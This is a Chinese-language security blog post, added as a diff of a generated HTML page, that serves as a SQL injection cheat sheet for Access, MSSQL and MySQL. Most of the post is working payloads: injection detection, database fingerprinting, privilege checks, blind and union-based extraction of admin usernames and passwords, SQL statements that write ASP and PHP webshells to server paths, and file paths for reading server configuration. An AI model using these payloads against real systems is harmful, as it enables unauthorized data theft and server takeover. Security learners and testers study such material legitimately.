@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="tea9">
+
+
+    <meta name="subtitle" content="加油">
+
+
+    <meta name="description" content="心中有光の孩子 提示：图片都存到了github仓库需要挂代理才能看到">
+
+
+    <meta name="keywords" content="tea9,tea9的博客,开发,android,安全,android安全,android逆向,移动安全,frida,xposed,ollvm,查查查,茶茶茶,茶茶,茶姐姐,茶姐姐博客,茶茶茶博客,茶茶blog">
+
+
+<title>sql注入笔记 | tea9のblog</title>
+
+
+
+    <link rel="icon" href="/image/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Tea9&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Tea9&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">sql注入笔记</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">tea9</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">十一月 9, 2020&nbsp;&nbsp;21:14:23</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/Security/">Security</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p>简单判定有无漏洞：</p>
+<p>粗略型：提交单引号’</p>
+<p>逻辑型（数字型注入）：and 1&#x3D;1&#x2F;and 1&#x3D;2</p>
+<p>逻辑型（字符型注入）：’ and ‘1’&#x3D;’1&#x2F;‘ and ‘1’&#x3D;’2</p>
+<p>逻辑型（搜索型注入）：%’ and 1&#x3D;1 and ‘%’&#x3D;’%&#x2F;%’ and 1&#x3D;2 and ‘%’&#x3D;’%</p>
+<p>简单判断数据库信息：</p>
+<p>粗略型：</p>
+<p>加单引号’（根据服务器报错的信息来判断）</p>
+<p>加;–（;表示分离，– 则是注释符，;和–MSSQL数据库有，ACCESS数据库没有）</p>
+<p>逻辑型：</p>
+<p>and user&gt;0</p>
+<p>and (select count(*) from msysobjects)&gt;0 ……（页面错误为access数据库）</p>
+<p>and (select count(*) from sysobjects)&gt;0 ……（页面正常为MSSQL数据库）</p>
+<p>and db_name()&gt;0 ……（爆数据库名）</p>
+<p>and version&gt;0（爆SQLServer版本信息以及服务器操作系统的类型和版本信息）</p>
+<p>判断MSSQL权限：</p>
+<p>and 0&lt;&gt;（Select ISSRVROLEMEMBER（’sysadmin’））–（页面正常则为SA）</p>
+<p>and 0&lt;&gt;（Select IS_MEMBER（’db_owner’））–（页面正常则为db_owner）</p>
+<p>and 0&lt;&gt;（Select IS_MEMBER（’public’））–（页面正常则是public）</p>
+<p>注意：</p>
+<p>以上方法适用于参数是int数字型的时候。</p>
+<p>若为字符型，需在参数后添加单引号’并在查询语句后添加;–，搜索型注入以此类推。</p>
+<p>ACCESS注入基本流程：</p>
+<p>猜解表名：</p>
+<p>and 0&lt;&gt;(select count(*) from 表名) 或 and exists（Select * from 表名）</p>
+<p>猜解字段：</p>
+<p>and exists（Select 字段名 from 表名）（页面正常存在该字段，不正常不存在该字段）</p>
+<p>猜解用户名和密码长度：</p>
+<p>and（Select top 1 len（列名） from 表名）&gt;N</p>
+<p>（TOP表示把最前面的一条记录提取出来；N为变换猜解的列长度，页面错误即说明该列长度为N）</p>
+<p>如：</p>
+<p>and 1&#x3D;(select count(*) from user where len(name)&gt;6) 错误</p>
+<p>and 1&#x3D;(select count(*) from user where len(name)&gt;5) 正确</p>
+<p>则表示user表中name字段的第一条记录的长度是6。</p>
+<p>猜解用户名和密码：</p>
+<p>and (select top 1 asc(mid(列名,1,1)) from 表名)&gt;0</p>
+<p>如：</p>
+<p>and (select top 1 asc(mid(name,1,1)) from user)&gt;96 页面正常</p>
+<p>and (select top 1 asc(mid(name,1,1)) from user)&gt;97 页面错误</p>
+<p>则表示user表中name字段的第一条记录的第一个字符的ASCLL码为97</p>
+<p>注意：</p>
+<p>因为MD5的密文长度通常有16位、18位、32位、40位等几种，</p>
+<p>所以猜解密码的时候试一试15、16、17、18、31、32、39、40等长度可以加快猜解进度。</p>
+<p>MSSQL报错注入基本流程：</p>
+<p>爆出表名和字段：having 1&#x3D;1–</p>
+<p>猜解表名：</p>
+<p>获得第一个表名：</p>
+<p>and (select top 1 name from sysobjects where xtype&#x3D;’u’)&gt;0</p>
+<p>获得第二个表名：</p>
+<p>and (select top 1 name from sysobjects where xtype&#x3D;’u’ and name not in (‘user’))&gt;0</p>
+<p>以此类推。</p>
+<p>猜解列名：</p>
+<p>得到col_name表中的第一个列名：</p>
+<p>and (select top 1 col_name(object_id(‘字段’),1) from sysobjects)&gt;0</p>
+<p>猜解字段内容：</p>
+<p>and (select top 1 列名 from [表名])&gt;0</p>
+<p>如：</p>
+<p>获取用户名：</p>
+<p>and (select top 1 username from [admin])&gt;0</p>
+<p>获取密码：</p>
+<p>and (select top 1 password from [admin])&gt;0</p>
+<p>导出webshell：</p>
+<p>方法1：利用SQL执行命令功能导出WebShell</p>
+<p>SELECT ‘&lt;%execute request(“a”)%&gt;’ into [vote] in ‘d:webx.asp;.xls’ ‘excel 8.0;’ from vote</p>
+<p>注意：需拥有SQL执行权限且知道绝对路径</p>
+<p>方法2：</p>
+<p>建立一个有一个A字段的表 表名为a，字段类型为字符，长度为50。</p>
+<p>在表A的a字段插入一句话木马，把表a的内容导出为物理路径的一个EXCEL文件。</p>
+<p>导出为EXCEL后在利用IIS解析漏洞就可以变成webshell了。</p>
+<p>方法2的SQL语句：</p>
+<p>create table cmd (a varchar(50))</p>
+<p>insert into cmd (a) values (‘&lt;%execute request(“listentide”)%&gt;’)</p>
+<p>select * into [a] in ‘f:hostqhdyxtweba.asp;.xls’ ‘excel 4.0;’ from cmd</p>
+<p>drop table cmd</p>
+<p>MYSQL注入基本流程：</p>
+<p>MYSQL注入漏洞是否存在的判断方法与ACCESS注入和MSSQL注入相同。</p>
+<p>MYSQL注入漏洞的数据库类型判断方法也可以使用单引号’。</p>
+<p>数据库权限判断：</p>
+<p>and ord(mid(user(),1,1))&#x3D;114 &#x2F;* （页面正常说明为root）</p>
+<p>判断当前页面字段总数：</p>
+<p>方法1、用union联合查询：and 1&#x3D;1 union select 1,2,3,4,5……</p>
+<p>方法2、用order by 查询“order by *–</p>
+<p>判断显示位：</p>
+<p>方法1、<a target="_blank" rel="noopener" href="http://www.f4ck.org/article.php?id=1">http://www.f4ck.org/article.php?id=1</a> and 1&#x3D;2 union select 1,2,3,4,5,6,7……</p>
+<p>方法2、<a target="_blank" rel="noopener" href="http://www.f4ck.org/article.php?id=-1">http://www.f4ck.org/article.php?id=-1</a> union select 1,2,3,4,5,6,7……</p>
+<p>查库：</p>
+<p>版本大于5.0的mysql的information_schema库中存储着mysql的所有数据库和表结构信息，所以可以利用information_schema库快速注入。</p>
+<p>获取第一个库名：</p>
+<p>and 1&#x3D;2 union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1</p>
+<p>获取第二个库名：</p>
+<p>and 1&#x3D;2 union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 1,2</p>
+<p>以此类推。</p>
+<p>查表：</p>
+<p>获取数据库中第一个表名：</p>
+<p>and 1&#x3D;2 union select 1,2,3,TABLE_NAME,5,6,7,8,9,10 from information_schema.TABLES where TABLE_SCHEMA&#x3D;数据库名的十六进制 limit 0,1</p>
+<p>获取数据库中第二个表名：</p>
+<p>and 1&#x3D;2 union select 1,2,3,TABLE_NAME,5,6,7,8,9,10 from information_schema.TABLES where TABLE_SCHEMA&#x3D;数据库名的十六进制 limit 1,2</p>
+<p>查列：</p>
+<p>获取数据库中指定表的第一个列名：</p>
+<p>and 1&#x3D;2 Union select 1,2,3,COLUMN_NAME,5,6,7,8,9,10 from information_schema.COLUMNS where TABLE_NAME&#x3D;表名的十六进制 limit 0,1</p>
+<p>获取数据库中指定表的第二个列名：</p>
+<p>and 1&#x3D;2 Union select 1,2,3,COLUMN_NAME,5,6,7,8,9,10 from information_schema.COLUMNS where TABLE_NAME&#x3D;表名的十六进制 limit 0,1</p>
+<p>得到字段内容：</p>
+<p>在不同的显示位显示不同的字段内容：</p>
+<p>and 1&#x3D;2 Union select 1,2,3,用户名段,5,6,7,密码段,8,9 from 表名 limit 0,1</p>
+<p>在同一个显示位显示不同的字段内容：</p>
+<p>and 1&#x3D;2 Union select 1,2,3concat(用户名段,0x3c,密码段),5,6,7,8,9 from 表名 limit 0,1</p>
+<p>一次性查出所有表名：</p>
+<p>union select 1,2,3,4,GROUP_CONCAT(DISTINCT table_name),6 from information_schema.columns where table_schema&#x3D;数据库名的16进制</p>
+<p>一次性查出所有字段名：</p>
+<p>union select 1,2,3,4,GROUP_CONCAT(DISTINCT column_name),6 from information_schema.columns where table_schema&#x3D;数据库名的16进制</p>
+<p>导出一句话WebShell：</p>
+<p>方法1：</p>
+<p>Drop TABLE IF EXISTS temp;</p>
+<p>Create TABLE temp(cmd text NOT NULL);</p>
+<p>Insert INTO temp (cmd) VALUES(‘’);</p>
+<p>Select cmd from temp into out file ‘F:&#x2F;wwwroot&#x2F;eval.php’;</p>
+<p>Drop TABLE IF EXISTS temp;</p>
+<p>方法2：</p>
+<p>Select ‘’ into outfile ‘F:&#x2F;wwwroot&#x2F;eval.php’;</p>
+<p>load_file() 常用路径：</p>
+<p>c:&#x2F;windows&#x2F;system32&#x2F;inetsrv&#x2F;MetaBase.xml 查看IIS的虚拟主机配置文件</p>
+<p>&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf或&#x2F;usr&#x2F;local&#x2F;apche&#x2F;conf&#x2F;httpd.conf 查看linux APACHE虚拟主机配置文件</p>
+<p>c:&#x2F;Program Files&#x2F;Apache Group&#x2F;Apache&#x2F;conf&#x2F;httpd.conf 或C:&#x2F;apache&#x2F;conf&#x2F;httpd.conf 查看WINDOWS系统apache的配置文件</p>
+<p>c:&#x2F;Resin-3.0.14&#x2F;conf&#x2F;resin.conf查看jsp开发的网站 resin文件配置信息</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>tea9</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://tea9.xyz/post/1457277301.html">http://tea9.xyz/post/1457277301.html</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2017-2022 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/web%E5%AE%89%E5%85%A8/"># web安全</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/post/2045415669.html">在线靶场-IIS写权限漏洞分析溯源</a>
+            
+            
+            <a class="next" rel="next" href="/post/3315566214.html">android8.0证书安装</a>
+            
+        </section>
+    </article>
+</div>
+
+
+
+
+            </div>
+            <footer id="footer" class="footer">
+ 
+    <div class="copyright">
+        <span>© tea9 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+   
+</footer>
+
+    </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"live2d-widget-model-hijiki"},"display":{"position":"right","width":200,"height":350},"mobile":{"show":true},"log":false});</script></body>
+
+</html>
